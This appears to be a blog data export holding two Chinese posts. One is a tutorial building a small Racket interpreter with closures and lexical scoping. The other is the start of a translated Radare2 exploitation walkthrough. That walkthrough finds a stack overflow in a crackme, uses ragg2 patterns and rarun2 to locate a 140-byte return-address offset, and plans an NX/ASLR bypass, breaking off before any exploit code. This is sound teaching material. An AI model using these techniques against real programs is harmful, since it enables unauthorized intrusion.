R2：一个很小的程序语言实现了一个计算器，现在让我们过渡到一种更强大的语言。为了方便称呼，我给它起了一个萌萌哒名字，叫 R2。R2 比起之前的计算器，只多出四个元素，它们分别是：变量，函数，绑定，调用。再加上之前介绍的算术操作，我们就得到一个很简单的程序语言，它只有 5 种不同的构造。用 Scheme 的语法，这 5 种构造看起来就像这样： 变量：x 函数：(lambda (x) e) 绑定：(let ([x e1]) e2) 调用：(e1 e2) 算术：(• e2 e2)（其中，• 是一个算术操作符，可以选择 +, -, *, / 其中之一） 一般程序语言还有很多其它构造，可是一开头就试图去实现所有那些，只会让人糊涂。最好是把这少数几个东西搞清楚，确保它们正确之后，才慢慢加入其它元素。 这些构造的语义，跟 Scheme 里面的同名构造几乎一模一样。如果你不清楚什么是”绑定“，那你可以把它看成是普通语言里的”变量声明“。 需要注意的是，跟一般语言不同，我们的函数只接受一个参数。这不是一个严重的限制，因为在我们的语言里，函数可以被作为值传递，也就是所谓“first-class function”。所以你可以用嵌套的函数定义来表示有两个以上参数的函数。 举个例子， (lambda (x) (lambda (y) (+ x y))) 是个嵌套的函数定义，它也可以被看成是有两个参数（x 和 y）的函数，这个函数返回 x 和 y 的和。当这样的函数被调用的时候，需要两层调用，就像这样： 12(((lambda (x) (lambda (y) (+ x y))) 1) 2);; =&gt; 3 这种做法在 PL 术语里面，叫做咖喱（currying）。看起来啰嗦，但这样我们的解释器可以很简单。等我们理解了基本的解释器，再实现真正的多参数函数也不迟。 另外，我们的绑定语法 (let ([x e1]) e2)，比起 Scheme 的绑定也有一些局限。我们的 let 只能绑定一个变量，而 Scheme 可以绑定多个，像这样 (let ([x 1][y 2]) (+ x y))。这也不是一个严重的限制，因为我们可以啰嗦一点，用嵌套的 let 绑定： 123(let ([x 1]) (let ([y 2]) (+ x y))) R2 的解释器下面是我们今天要完成的解释器，它可以运行一个 R2 程序。你可以先留意一下各部分的注释。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#lang racket;;; 以下三个定义 env0, ext-env, lookup 是对环境（environment）的基本操作：;; 空环境(define env0 &apos;());; 扩展。对环境 env 进行扩展，把 x 映射到 v，得到一个新的环境(define ext-env (lambda (x v env) (cons `(,x . ,v) env)));; 查找。在环境中 env 中查找 x 的值。如果没找到就返回 #f(define lookup (lambda (x env) (let ([p (assq x env)]) (cond [(not p) #f] [else (cdr p)]))));; 闭包的数据结构定义，包含一个函数定义 f 和它定义时所在的环境(struct Closure (f env));; 解释器的递归定义（接受两个参数，表达式 exp 和环境 env）;; 共 5 种情况（变量，函数，绑定，调用，数字，算术表达式）(define interp (lambda (exp env) (match exp ; 对exp进行模式匹配 [(? symbol? x) ; 变量 (let ([v (lookup x env)]) (cond [(not v) (error &quot;undefined variable&quot; x)] [else v]))] [(? number? x) x] ; 数字 [`(lambda (,x) ,e) ; 函数 (Closure exp env)] [`(let ([,x ,e1]) ,e2) ; 绑定 (let ([v1 (interp e1 env)]) (interp e2 (ext-env x v1 env)))] [`(,e1 ,e2) ; 调用 (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match v1 [(Closure `(lambda (,x) ,e) env-save) (interp e (ext-env x v2 env-save))]))] [`(,op ,e1 ,e2) ; 算术表达式 (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match op [&apos;+ (+ v1 v2)] [&apos;- (- v1 v2)] [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))])));; 解释器的“用户界面”函数。它把 interp 包装起来，掩盖第二个参数，初始值为 env0(define r2 (lambda (exp) (interp exp env0))) 这里有一些测试例子： 123456789101112131415161718192021222324252627(r2 &apos;(+ 1 2));; =&gt; 3(r2 &apos;(* 2 3));; =&gt; 6(r2 &apos;(* 2 (+ 3 4)));; =&gt; 14(r2 &apos;(* (+ 1 2) (+ 3 4)));; =&gt; 21(r2 &apos;((lambda (x) (* 2 x)) 3));; =&gt; 6(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (f 3))));; =&gt; 6(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))));; =&gt; 6 （完整的代码和示例，可以在这里下载。) 在接下来的几节，我们来仔细看看这个解释器的各个部分。 对基本算术操作的解释算术操作一般都是程序里最基本的构造，它们不能再被细分为多个步骤，所以我们先来看看对算术操作的处理。以下就是 R2 解释器处理算术的部分，它是 interp 的最后一个分支。 12345678910(match exp ... ... [`(,op ,e1 ,e2) (let ([v1 (interp e1 env)] ; 递归调用 interp 自己，得到 e1 的值 [v2 (interp e2 env)]) ; 递归调用 interp 自己，得到 e2 的值 (match op ; 分支：处理操作符 op 的 4 种情况 [&apos;+ (+ v1 v2)] ; 如果是加号，输出结果为 (+ v1 v2) [&apos;- (- v1 v2)] ; 如果是减号，乘号，除号，相似的处理 [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))]) 你可以看到它几乎跟刚才写的计算器一模一样，不过现在 interp 的调用多了一个参数 env 而已。这个 env 是所谓“环境”，我们下面很快就讲。 对数字的解释对数字的解释很简单，把它们原封不动返回就可以了。 [(? number? x) x] 变量和函数变量和函数是解释器里最麻烦的部分，所以我们来仔细看看。 变量（variable）的产生，是数学史上的最大突破之一。因为变量可以被绑定到不同的值，从而使函数的实现成为可能。比如数学函数 f(x) = x _ 2，其中 x 是一个变量，它把输入的值传递到函数体 x _ 2 里面。如果没有变量，函数就不可能实现。 对变量最基本的操作，是对它的“绑定”（binding）和“取值”（evaluate）。什么是绑定呢？拿上面的函数 f(x) 作为例子。当我们调用 f(1) 时，函数体里面的 x 等于 1，所以 x _ 2 的值是 2，而当我们调用 f(2) 时，函数体里面的 x 等于 2，所以 x _ 2 的值是 4。这里，两次对 f 的调用，分别对 x 进行了两次绑定。第一次 x 被绑定到了 1，第二次被绑定到了 2。 你可以把“绑定”理解成这样一个动作，就像当你把插头插进电源插座的那一瞬间。插头的插脚就是 f(x) 里面的那个 x，而 x * 2 里面的 x，则是电线的另外一端。所以当你把插头插进插座，电流就通过这根电线到达另外一端。如果电线导电性能良好，两头的电压应该相等。 环境我们的解释器只能一步一步的做事情。比如，当它需要求 f(1) 的值的时候，它分成两步操作： 把 x 绑定到 1，这样函数体内才能看见这个绑定。 进入 f 的函数体，对 x * 2 进行求值。 这就像一个人做出这两个动作： 把插头插进插座 。 到电线的另外一头，测量它的电压，并且把结果乘以 2。 在第一步和第二步之间，我们如何记住 x 的值呢？通过所谓“环境”！我们用环境记录变量的值，并且把它们传递到变量的“可见区域”。变量的可见区域，用术语说叫做“作用域”（scope）。 在我们的解释器里，用于处理环境的代码如下： 123456789101112131415;; 空环境(define env0 &apos;());; 对环境 env 进行扩展，把 x 映射到 v(define ext-env (lambda (x v env) (cons `(,x . ,v) env)));; 取值。在环境中 env 中查找 x 的值(define lookup (lambda (x env) (let ([p (assq x env)]) (cond [(not p) #f] [else (cdr p)])))) 这里我们用一种最简单的数据结构，Scheme 的 association list，来表示环境。Association list 看起来像这个样子：((x . 1) (y . 2) (z . 5))。它是一个两元组（pair）的链表，左边的元素是 key，右边的元素是 value。写得直观一点就是： 123((x . 1) (y . 2) (z . 5)) 查表操作就是从头到尾搜索，如果左边的 key 是要找的变量，就返回整个 pair。简单吧？效率很低，但是足够完成我们现在的任务。 ext-env 函数扩展一个环境。比如，如果原来的环境 env1 是 ((y . 2) (x . 1)) 那么 (ext-env x 3 env1)，就会返回 ((x . 3) (y . 2) (x . 1))。也就是把 (x . 3) 加到 env1 的最前面去。 那我们什么时候需要扩展环境呢？当我们进行绑定的时候。绑定可能出现在函数调用时，也可能出现在 let 绑定时。我们选择的数据结构，使得环境自然而然的具有了作用域（scope）的特性。 环境其实是一个堆栈（stack）。内层的绑定，会出现在环境的最上面，这就是在“压栈”。这样我们查找变量的时候，会优先找到最内层定义的变量。 举个例子： 12345(let ([x 1]) ; env=&apos;()。绑定x到1。 (let ([y 2]) ; env=&apos;((x . 1))。绑定y到2。 (let ([x 3]) ; env=&apos;((y . 2) (x . 1))。绑定x到3。 (+ x y)))) ; env=&apos;((x . 3) (y . 2) (x . 1))。查找x，得到3；查找y，得到2。;; =&gt; 5 这段代码会返回 5。这是因为最内层的绑定，把 (x . 3) 放到了环境的最前面，这样查找 x 的时候，我们首先看到 (x . 3)，然后就返回值 3。之前放进去的 (x . 1) 仍然存在，但是我们先看到了最上面的那个(x . 3)，所以它被忽略了。 这并不等于说 (x . 1) 就可以被改写或者丢弃，因为它仍然是有用的。你只需要看一个稍微不同的例子，就知道这是怎么回事： 12345(let ([x 1]) ; env=&apos;()。绑定x到1。 (+ (let ([x 2]) ; env=&apos;((x . 1))。绑定x到2。 x) ; env=&apos;((x . 2) (x . 1))。查找x，得到2。 x)) ; env=&apos;((x . 1))。查找x，得到1。;; =&gt; 3 ; 两个不同的x的和，1+2等于3。 这个例子会返回 3。它是第 3 行和第 4 行里面两个 x 的和。由于第 3 行的 x 处于内层 let 里面，那里的环境是 ((x . 2) (x . 1))，所以查找 x 的值得到 2。第 4 行的 x 在内层 let 外面，但是在外层 let 里面，那里的环境是 ((x . 1))，所以查找 x 的值得到 1。这很符合直觉，因为 x 总是找到最内层的定义。 值得注意的是，环境被扩展以后，形成了一个新的环境，而原来的环境并没有被改变。比如，上面的 ((y . 2) (x . 1)) 并没有删除或者修改，只不过是被“引用”到一个更大的列表里去了。 这样不对已有数据进行修改（mutation）的数据结构，叫做“函数式数据结构”。函数式数据结构只生成新的数据，而不改变或者删除老的。它可能引用老的结构，然而却不改变老的结构。这种“不修改”（immutable）的性质，在我们的解释器里是很重要的，因为当我们扩展一个环境，进入递归，返回之后，外层的代码必须仍然可以访问原来外层的环境。 当然，我们也可以用另外的，更高效的数据结构（比如平衡树，串接起来的哈希表）来表示环境。如果你学究一点，甚至可以用函数来表示环境。这里为了代码简单，我们选择了最笨，然而正确，容易理解的数据结构。 对变量的解释了解了变量，函数和环境，我们来看看解释器对变量的“取值”操作，也就是 match 的第一种情况。 [(? symbol? x) (lookup x env)] 这就是在环境中，沿着从内向外的“作用域顺序”，查找变量的值。 这里的 (? symbol? x) 是一种特殊的模式，它使用 Scheme 函数 symbol? 来判断输入是否是一个符号，如果是，就把它绑定到 x，然后你就可以在右边用 x 来指称这个输入。 对绑定的解释现在我们来看看对 let 绑定的解释： 123[`(let ([,x ,e1]) ,e2) (let ([v1 (interp e1 env)]) ; 解释右边表达式e1，得到值v1 (interp e2 (ext-env x v1 env)))] ; 把(x . v1)扩充到环境顶部，对e2求值 通过代码里的注释，你也许已经可以理解它在做什么。我们先对表达式 e1 求值，得到 v1。然后我们把 (x . v1) 扩充到环境里，这样 (let ([x e1]) …) 内部都可以看到 x 的值。然后我们使用这个扩充后的环境，递归调用解释器本身，对 let 的主体 e2 求值。它的返回值就是这个 let 绑定的值。 Lexical Scoping 和 Dynamic Scoping下面我们准备谈谈函数定义和调用。对函数的解释是一个微妙的问题，很容易弄错，这是由于函数体内也许会含有外层的变量，叫做“自由变量”。所以在分析函数的代码之前，我们来了解一下不同的“作用域”（scoping）规则。 我们举个例子来解释这个问题。下面这段代码，它的值应该是多少呢？ 1234(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))) 在这里，f 函数体 (lambda (y) (* x y)) 里的那个 x，就是一个“自由变量”。x 并不是这个函数的参数，也不是在这个函数里面定义的，所以我们必须到函数外面去找 x 的值。 我们的代码里面，有两个地方对 x 进行了绑定，一个等于 2，一个等于 4，那么 x 到底应该是指向哪一个绑定呢？这似乎无关痛痒，然而当我们调用 (f 3) 的时候，严重的问题来了。f 的函数体是 (* x y)，我们知道 y 的值来自参数 3，可是 x 的值是多少呢？它应该是 2，还是 4 呢？ 在历史上，这段代码可能有两种不同的结果，这种区别一直延续到今天。如果你在 Scheme （Racket）里面写以上的代码，它的结果是 6。 1234567;; Scheme(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3))));; =&gt; 6 现在我们来看看，在 Emacs Lisp 里面输入等价的代码，得到什么结果。如果你不熟悉 Emacs Lisp 的用法，那你可以跟我做：把代码输入 Emacs 的那个叫 scratch 的 buffer。把光标放在代码最后，然后按 C-x C-e，这样 Emacs 会执行这段代码，然后在 minibuffer 里显示结果： 结果是 12！如果你把代码最内层的 x 绑定修成其它的值，输出会随之改变。 奇怪吧？Scheme 和 Emacs Lisp，到底有什么不一样呢？实际上，这两种看似差不多的 “Lisp 方言”，采用了两种完全不同的作用域方式。Scheme 的方式叫做 lexical scoping （或者 static scoping），而 Emacs 的方式叫做 dynamic scoping。 那么哪一种方式更好呢？或者用哪一种都无所谓？答案是，dynamic scoping 是非常错误的做法。历史的教训告诉我们，它会带来许许多多莫名其妙的 bug，导致 dynamic scoping 的语言几乎完全没法用。这是为什么呢？ 原因在于，像 (let ((x 4)) …) 这样的变量绑定，只应该影响它内部“看得见”的 x 的值。当我们看见 (let ((x 4)) (f 3)) 的时候，并没有在 let 的内部看见任何叫“x” 的变量，所以我们“直觉”的认为，(let ((x 4)) …) 对 x 的绑定，不应该引起 (f 3) 的结果变化。 然而对于 dynamic scoping，我们的直觉却是错误的。因为 f 的函数体里面有一个 x，虽然我们没有在 (f 3) 这个调用里面看见它，然而它却存在于 f 定义的地方。要知道，f 定义的地方也许隔着几百行代码，甚至在另外一个文件里面。而且调用函数的人凭什么应该知道， f 的定义里面有一个自由变量，它的名字叫做 x？所以 dynamic scoping 在设计学的角度来看，是一个反人类的设计 :) 相反，lexical scoping 却是符合人们直觉的。虽然在 (let ((x 4)) (f 3)) 里面，我们把 x 绑定到了 4，然而 f 的函数体并不是在那里定义的，我们也没在那里看见任何 x，所以 f 的函数体里面的 x，仍然指向我们定义它的时候看得见的那个 x，也就是最上面的那个 (let ([x 2]) …)，它的值是 2。所以 (f 3) 的值应该等于 6，而不是 12。 对函数的解释为了实现 lexical scoping，我们必须把函数做成“闭包”（closure）。闭包是一种特殊的数据结构，它由两个元素组成：函数的定义和当前的环境。我们把闭包定义为一个 Racket 的 struct 结构： 1(struct Closure (f env)) 有了这个数据结构，我们对 (lambda (x) e) 的解释就可以写成这样： 12[`(lambda (,x) ,e) (Closure exp env)] 注意这里的 exp 就是 (lambda (,x) ,e)` 自己。 有意思的是，我们的解释器遇到 (lambda (x) e)，几乎没有做任何计算。它只是把这个函数包装了一下，把它与当前的环境一起，打包放到一个数据结构（Closure）里面。这个闭包结构，记录了我们在函数定义的位置“看得见”的那个环境。稍候在调用的时候，我们就能从这个闭包的环境里面，得到函数体内的自由变量的值。 对调用的解释好了，我们终于到了最后的关头，函数调用。为了直观，我们把函数调用的代码拷贝如下： 123456[`(,e1 ,e2) (let ([v1 (interp e1 env)] ; 计算函数 e1 的值 [v2 (interp e2 env)]) ; 计算参数 e2 的值 (match v1 [(Closure `(lambda (,x) ,e) env-save) ; 用模式匹配的方式取出闭包里的各个子结构 (interp e (ext-env x v2 env-save))]))] ; 在闭包的环境env-save中把x绑定到v2，解释函数体 函数调用都是 (e1 e2) 这样的形式，e1 表示函数，e2 是它的参数。我们需要先分别求出函数 e1 和参数 e2 的值。 函数调用就像把一个电器的插头插进插座，使它开始运转。比如，当 (lambda (x) (_ x 2)) 被作用于 1 时，我们把 x 绑定到 1，然后解释它的函数体 (_ x 2)。但是这里有一个问题，函数体内的自由变量应该取什么值呢？从上面闭包的讨论，你已经知道了，自由变量的值，应该从闭包的环境查询。 操作数 e1 的值 v1 是一个闭包，它里面包含一个函数定义时保存的环境 env-save。我们把这个环境 env-save 取出来，那我们就可以查询它，得到函数体内自由变量的值。然而函数体内不仅有自由变量，还有对函数参数的使用，所以我们必须扩展这个 env-save 环境，把参数的值加进去。这就是为什么我们使用 (ext-env x v2 env-save)，而不只是 env-save。 你可能会奇怪，那么解释器的环境 env 难道这里就不用了吗？是的。我们通过 env 来计算 e1 和 e2 的值，是因为 e1 和 e2 里面的变量，在“当前环境”（env）里面看得见。可是函数体的定义，在当前环境下是看不见的。它的代码在别的地方，而那个地方看得见的环境，被我们存在闭包里了，它就是 env-save。所以我们把 v1 里面的闭包环境 env-save 取出来，用于计算函数体的值。 有意思的是，如果我们用 env，而不是 env-save 来解释函数体，那我们的语言就变成了 dynamic scoping。现在来实验一下：你可以把 (interp e (ext-env x v2 env-save)) 里面的 env-save 改成 env，再试试我们之前讨论过的代码，它的输出就会变成 12。那就是我们之前讲过的，dynamic scoping 的结果。 1234567(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))));; =&gt; 12 你也许发现了，如果我们的语言是 dynamic scoping，那就没必要使用闭包了，因为我们根本不需要闭包里面保存的环境。这样一来，dynamic scoping 的解释器就可以写成这样： 123456789101112131415(define interp (lambda (exp env) (match exp ... ... [`(lambda (,x) ,e) ; 函数：直接返回自己的表达式 exp] ... ... [`(,e1 ,e2) (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match v1 [`(lambda (,x) ,e) ; 调用：直接使用函数的表达式本身 (interp e (ext-env x v2 env))]))] ... ...))) 注意到这个解释器的函数有多容易实现吗？它就是这个函数的表达式自己，原封不动。用函数的表达式本身来表示它的值，是很直接很简单的做法，也是大部分人一开头就会想到的。然而这样实现出来的语言，就不知不觉地采用了 dynamic scoping。 这就是为什么很多早期的 Lisp 语言，比如 Emacs Lisp，都使用 dynamic scoping。这并不是因为它们的设计者在 dynamic scoping 和 lexical scoping 两者之中做出了选择，而是因为使用函数的表达式本身来作为它的值，是最直接，一般人都会首先想到的做法。 另外，在这里我们也看到环境用“函数式数据结构”表示的好处。闭包被调用时它的环境被扩展，但是这并不会影响原来的那个环境，我们得到的是一个新的环境。所以当函数调用返回之后，函数的参数绑定就自动“注销”了。 如果你用一个非函数式的数据结构，在绑定参数时不生成新的环境，而是对已有环境进行赋值，那么这个赋值操作就会永久性的改变原来环境的内容。所以你在函数返回之后必须删除参数的绑定。这样不但麻烦，而且在复杂的情况下很容易出错。 思考题：可能有些人看过 lambda calculus，这些人可能知道 (let ([x e1]) e2) 其实等价于一个函数调用：((lambda (x) e2) e1)。现在问题来了，我们在讨论函数和调用的时候，很深入的讨论了关于 lexical scoping 和 dynamic scoping 的差别。既然 let 绑定等价于一个函数定义和调用，为什么之前我们讨论对绑定的时候，没有讨论过 lexical scoping 和 dynamic scoping 的问题，也没有制造过闭包呢？ 不足之处现在你已经学会了如何写出一个简单的解释器，它可以处理一个相当强大的函数式语言。出于教学的考虑，这个解释器并没有考虑实用的需求，所以它并不能作为工业应用。在这里，我指出它的一些不足之处。 缺少必要的语言构造。我们的语言里缺少好些实用语言必须的构造：递归，数组，赋值操作，字符串，自定义数据结构，…… 作为一篇基础性的读物，我不能把这些都加进来。如果你对这些有兴趣，可以看看其它书籍，或者等待我的后续作品。 不合法代码的检测和报告。你也许发现了，这个解释器的 match 表达式，全都假定了输入都是合法的程序，它并没有检查不合法的情况。如果你给它一个不合法的程序，它不会马上报错，而是会真去算它，以至于导致奇怪的后果。一个实用的解释器，必须加入对代码格式进行全面检测，在运行之前就报告不合法的代码结构。 低效率的数据结构。在 association list 里面查找变量，是线性的复杂度。当程序有很多变量的时候就有性能问题。一个实用的解释器，需要更高效的数据结构。这种数据结构不一定非得是函数式的。你也可以用非函数式的数据结构（比如哈希表），经过一定的改造，达到同样的性质，却具有更高的效率。 ​ 另外，你还可以把环境转化成一个数组。给环境里的每个变量分配一个下标（index），在这个数组里就可以找到它的值。如果你用数组表示环境，那么这个解释器就向编译器迈进了一步。 S 表达式的歧义问题。为了教学需要，我们的解释器直接使用 S 表达式来表达语法树，用模式匹配来进行分支遍历。在实际的语言里，这种方式会带来比较大的问题。因为 S 表达式是一种通用的数据结构，用它表示的东西，看起来都差不多的样子。一旦程序的语法构造多起来，直接对 S 表达式进行模式匹配，会造成歧义。 ​ 比如 (,op ,e1 ,e2) ，你以为它只匹配二元算术操作，比如 (+ 1 2)。但它其实也可以匹配一个 let 绑定： (let ([x 1]) (* x 2))。这是因为它们顶层元素的数目是一样的。为了消除歧义，你得小心的安排模式的顺序，比如你必须把 (let ([,x ,e1]) ,e2) 的模式放在 (,op ,e1, e2) 前面。所以最好的办法，是不要直接在 S 表达式上写解释器，而是先写一个“parser”，这个 parser 把 S 表达式转换成 Racket 的 struct 结构。然后解释器再在 struct 上面进行分支匹配。这样解释器不用担心歧义问题，而且会带来效率的提升。","categories":[],"tags":[{"name":"repost","slug":"repost","permalink":"qianfei11.coding.me/tags/repost/"}]},{"title":"【译】Radare2之旅-Part2：Exploitation","slug":"【译】Radare2之旅-Part2：Exploitation","date":"2019-02-23T03:18:10.000Z","updated":"2019-08-26T01:14:04.086Z","comments":true,"path":"2019/02/23/【译】Radare2之旅-Part2：Exploitation/","link":"","permalink":"qianfei11.coding.me/2019/02/23/【译】Radare2之旅-Part2：Exploitation/","excerpt":"翻译自Megabeets。","text":"翻译自Megabeets。 序言欢迎来到我们radare2之旅的第二部分！在这一部分，我们会涵盖radare2的更多部分，同时这次更注重于二进制漏洞挖掘。 相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的第一部分，我非常推荐你去读一读。第一部分记录了radare2的基础内容，同时也解释了很多我今天会用到的命令。 在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。radare2有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找 ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用radare2来绕过在开启ASLR的系统上运行并且有NX保护的程序。我假设大家都已经掌握了以下的预备知识： 汇编语言 程序保护技术（NX、ASLR） 栈帧结构 缓冲区溢出 面向返回编程 x86 调用约定 熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。 更新radare2首先，我们将radare2更新至其 git 的最新版版： 123$ git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话$ cd radare2$ ./sys/install.sh 等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。 熟悉程序你可以在这里下载程序，在这里下载源码。如果你想自己编译程序，用以下命令： 1$ gcc -m32 -fno-stack-protector megabeets_0x2.c -o megabeets_0x2 这次的程序与上一次的程序非常相似，只是在main()函数中有一些细微的改变： 编译时不使用参数-z execstac来开启NX 通过 scanf 来接收用户的输入，而不是通过程序的参数 大部分输出的函数为 puts 对程序的输出做了一点修改 这是之前的main()函数： 12345678910111213int main(int argc, char *argv[])&#123; printf(\"\\n .:: Megabeets ::.\\n\"); printf(\"Think you can make it?\\n\"); if (argc &gt;= 2 &amp;&amp; beet(argv[1])) &#123; printf(\"Success!\\n\\n\"); &#125; else printf(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; 然后现在的main函数是这样的： 12345678910111213141516int main(int argc, char *argv[])&#123; char *input; puts(\"\\n .:: Megabeets ::.\\n\"); puts(\"Show me what you got:\"); scanf(\"%ms\", &amp;input); if (beet(input)) &#123; printf(\"Success!\\n\\n\"); &#125; else puts(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; 程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过rot13加密的字符串Megabeets比较。故输入应该为Zrtnorrgf。 123456789101112131415$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:blablablablaNop, Wrong argument.$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:ZrtnorrgfSuccess! 这些都很简单，但是我们今天的重点并不是破解一个简单的 crackme，而是对其进行漏洞利用。那我们开始吧！ 理解漏洞对于每一个 PWN 题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的rabin2，或者直接在radare2的 shell 里执行i命令。因为我们还没有用radare2打开文件，就先用rabin2来看看： 1234567891011121314151617181920212223242526272829$ rabin2 -I megabeets_0x2arch x86binsz 6072bintype elfbits 32canary falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true 在标记的几行中，我们可以看到程序开了NX，也就是说栈是不可执行的。还有，该程序没有开启Canary、PIC或是RELRO。 现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用radare2的调试模式打开程序： 12345678$ r2 -d megabeets_0x2Process with PID 20859 started…= attach 20859 20859bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32– Your endian swaps[0xf7782b30]&gt; aas -d – 用调试模式打开 aas – 分析函数、符号以及其他 注意：正如我在前一篇文章所提到的，开始时使用aaa分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在这篇回答里写了更多——读一下也许会让你的理解更深。 现在我们继续执行程序，直到main函数。只要输入命令dcu main： 12345678[0xf7797b30]&gt; dcu?|Usage: dcu Continue until address| dcu address Continue until address| dcu [..tail] Continue until the range| dcu [from] [to] Continue until the range[0xf7797b30]&gt; dcu mainContinue until 0x08048658 using 1 bpsizehit breakpoint at: 8048658 dcu代表debug continue until 现在让我们输入VV进入图形模式。在第一部分解释过，你可以通过p和P切换视角，通过k/j/h/l分别向上/下/左/右移动，通过g和调用旁的字母跳转函数（例如gd）。 用?来列出所有在图形模式下的命令，同时别忘记R命令 😉 main()函数是程序要求我们输入的地方，并且它将输入传给sym.beet。通过gc我们跳转到处理我们输入的beet()函数： 我们可以看到用户的输入[arg_8h]被复制给一个缓冲区（[local_88h]），然后就是我们在前一篇文章中所看到过的，字符串Megabeets用rot13加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。 你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。 规划漏洞利用脚本既然我们已经找到了有漏洞的函数，我们需要构造一个 payload 来利用它。我们的目标很明了，就是在系统上成功开一个 shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的 payload 可以覆盖栈的偏移。 我们将会使用一个radare2框架中的工具，叫做ragg2。它能够为我们生成一段循环的德布鲁因序列，用来检测覆盖缓冲区的确切的偏移大小。 123456789$ ragg2 -&lt;truncated&gt; -P [size] prepend debruijn pattern&lt;truncated&gt; -r show raw bytes instead of hexpairs&lt;truncated&gt;$ ragg2 -P 100 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh 我们知道我们的程序通过输入流读取我们的输入，而不是从 shell 中读取我们的输入。故我们将会使用又一个来自radare2工具箱中的工具，rarun2。 rarun2可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如stdin） 如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。 我们需要做以下的三个步骤： 使用ragg2将德布鲁因序列写入一个文件 新建一个rarun2配置文件，并且把前一个文件作为stdin 让radare2来找到偏移 12345678910111213141516171819202122232425262728$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txtAAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt$ r2 -r profile.rr2 -d megabeets_0x2Process with PID 21663 started…= attach 21663 21663bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— Use rarun2 to launch your programs with a predefined environment.[0xf77c2b30]&gt; dcSelecting and continuing: 21663.:: Megabeets ::.Show me what you got?child stopped with signal 11[0x41417641]&gt; 我们运行程序，并将pattern.txt的内容用rarun2传给stdin，SIGSEV 11。 一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。 SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。 你发现了吗？我们实时的指针现在指向了0x41417641。这是一个无效的地址，它表示了字符串AvAA（小端序及 ascii 码转换），也就是我们送的字符串的一部分。radare2允许我们找到给出的值在德布鲁因序列中的偏移。 123456[0x41417641]&gt; wop?|Usage: wop[DO] len @ addr | value| wopD len [@ addr] Write a De Bruijn Pattern of length ‘len’ at address ‘addr’| wopO value Finds the given value into a De Bruijn Pattern at current offset[0x41417641]&gt; wopO `dr eip`140 既然我们已经知道需要覆盖返回地址的偏移为 140，我们可以开始编写脚本了。 编写漏洞利用脚本我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示radare2在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。 我们的目标是在系统中产生一个 shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了ASLR地环境下，所以我们不能猜测到libc在内存中的地址。那就可以和ret2libc说再见了。另外，程序开了NX，这意味栈是不可执行的，所以我们不能直接在栈上放一个shellcode然后跳过去。 虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。 让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库： 123456789101112$ r2 -d megabeets_0x2Process with PID 23072 started…= attach 23072 23072bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— You haxor! Me jane?[0xf7763b30]&gt; il[Linked libraries]libc.so.61 library il表示Information libraries，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的libc。 现在通过执行ii命令——Information 